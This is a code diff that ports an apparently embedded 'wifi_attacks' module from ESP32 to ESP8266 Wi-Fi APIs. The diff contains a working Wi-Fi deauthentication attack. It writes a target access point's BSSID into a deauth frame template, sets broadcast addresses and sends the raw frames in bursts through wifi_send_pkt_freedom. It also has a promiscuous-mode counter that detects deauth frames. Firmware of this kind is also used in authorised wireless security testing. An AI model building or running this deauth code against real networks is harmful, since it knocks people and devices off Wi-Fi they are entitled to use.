@@ -13,9 +13,10 @@
  */
 
 #include "wifi_attacks.h"
-#include <WiFi.h>
-#include "esp_wifi.h"
-#include "esp_wifi_types.h"
+#include <ESP8266WiFi.h>
+extern "C" {
+  #include "user_interface.h"
+}
 
 // ── State ────────────────────────────────────────────────────────
 static WifiAttackState _state = WATK_IDLE;
@@ -54,17 +55,16 @@ static uint8_t _deauthFrame[26] = {
  * Promiscuous mode RX callback
  * Counts all received frames and separately counts deauth/disassoc.
  */
-static void IRAM_ATTR _promiscRxCb(void* buf, wifi_promiscuous_pkt_type_t type) {
+static void _promiscRxCb(uint8_t *buf, uint16_t len) {
+  if (len < 13) return; // Must have RxControl + at least 1 byte
   _pktCount++;
 
-  if (type == WIFI_PKT_MGMT) {
-    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
-    const uint8_t* payload = pkt->payload;
-    uint8_t frameType = payload[0];
-    // Deauth = 0xC0, Disassoc = 0xA0
-    if (frameType == 0xC0 || frameType == 0xA0) {
-      _deauthPktCount++;
-    }
+  // On ESP8266, buf typically starts with struct RxControl (12 bytes)
+  // The first byte of the 802.11 frame is at offset 12.
+  uint8_t frameType = buf[12];
+  // Deauth = 0xC0, Disassoc = 0xA0
+  if (frameType == 0xC0 || frameType == 0xA0) {
+    _deauthPktCount++;
   }
 }
 
@@ -75,7 +75,7 @@ void wifi_attacks_init() {
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
   // Allow raw frame TX
-  esp_wifi_set_promiscuous(false);
+  wifi_promiscuous_enable(0);
   DBGLN(F("[WATK] WiFi attacks subsystem initialized"));
 }
 
@@ -90,8 +90,8 @@ void wifi_attacks_deauth_start(const uint8_t bssid[6], uint8_t channel) {
   _lastBurst = 0;
 
   // Set WiFi channel
-  esp_wifi_set_promiscuous(true);
-  esp_wifi_set_channel(_targetChannel, WIFI_SECOND_CHAN_NONE);
+  wifi_promiscuous_enable(1);
+  wifi_set_channel(_targetChannel);
 
   // Fill the BSSID into the deauth frame template
   memcpy(&_deauthFrame[10], _targetBSSID, 6);  // Source
@@ -104,7 +104,7 @@ void wifi_attacks_deauth_start(const uint8_t bssid[6], uint8_t channel) {
 
 void wifi_attacks_deauth_stop() {
   _state = WATK_STOPPED;
-  esp_wifi_set_promiscuous(false);
+  wifi_promiscuous_enable(0);
   DBGF("[WATK] Deauth stopped. Total frames: %lu\n", _frameCount);
 }
 
@@ -130,7 +130,7 @@ uint16_t wifi_attacks_update() {
     _deauthFrame[4] = 0xFF; _deauthFrame[5] = 0xFF;
     _deauthFrame[6] = 0xFF; _deauthFrame[7] = 0xFF;
     _deauthFrame[8] = 0xFF; _deauthFrame[9] = 0xFF;
-    esp_wifi_80211_tx(WIFI_IF_STA, _deauthFrame, sizeof(_deauthFrame), false);
+    wifi_send_pkt_freedom(_deauthFrame, sizeof(_deauthFrame), 0);
     _frameCount++;
     sent++;
 
@@ -140,7 +140,7 @@ uint16_t wifi_attacks_update() {
     _deauthFrame[10] = 0xFF; _deauthFrame[11] = 0xFF;
     _deauthFrame[12] = 0xFF; _deauthFrame[13] = 0xFF;
     _deauthFrame[14] = 0xFF; _deauthFrame[15] = 0xFF;
-    esp_wifi_80211_tx(WIFI_IF_STA, _deauthFrame, sizeof(_deauthFrame), false);
+    wifi_send_pkt_freedom(_deauthFrame, sizeof(_deauthFrame), 0);
     _frameCount++;
     sent++;
 
@@ -174,13 +174,13 @@ void wifi_attacks_startPacketCounter() {
   _deauthPktCount = 0;
   _pktCountStart = millis();
 
-  esp_wifi_set_promiscuous(true);
-  esp_wifi_set_promiscuous_rx_cb(&_promiscRxCb);
+  wifi_promiscuous_enable(1);
+  wifi_set_promiscuous_rx_cb(_promiscRxCb);
   DBGLN(F("[WATK] Packet counter started (promiscuous mode)"));
 }
 
 void wifi_attacks_stopPacketCounter() {
-  esp_wifi_set_promiscuous(false);
+  wifi_promiscuous_enable(0);
   DBGLN(F("[WATK] Packet counter stopped"));
 }
 
